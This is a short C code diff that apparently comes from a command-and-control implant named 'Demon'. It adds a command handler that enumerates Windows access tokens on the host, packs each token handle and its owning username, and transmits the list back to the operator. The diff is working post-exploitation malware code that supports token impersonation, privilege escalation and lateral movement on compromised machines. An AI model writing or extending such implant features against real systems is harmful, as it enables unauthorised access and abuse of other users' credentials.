@@ -1521,6 +1521,33 @@ VOID CommandToken( PPARSER Parser )
 
             break;
         }
+
+        case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::ListTokens" )
+        {
+            PSavedToken TokenList = NULL;
+            DWORD NumTokens = 0;
+            BOOL Success = FALSE;
+
+            Success = ListTokens( &TokenList, &NumTokens );
+
+            PackageAddInt32( Package, Success );
+
+            if ( Success )
+            {
+                for (DWORD i = 0; i < NumTokens; ++i)
+                {
+                    PackageAddInt32( Package, TokenList[ i ].token );
+                    PackageAddBytes( Package, TokenList[ i ].username, StringLengthA( TokenList[ i ].username ) );
+                }
+            }
+
+            if ( TokenList )
+            {
+                DATA_FREE( TokenList, NumTokens * sizeof( SavedToken ) );
+            }
+
+            break;
+        }
     }
 
     PackageTransmit( Package, NULL, NULL );
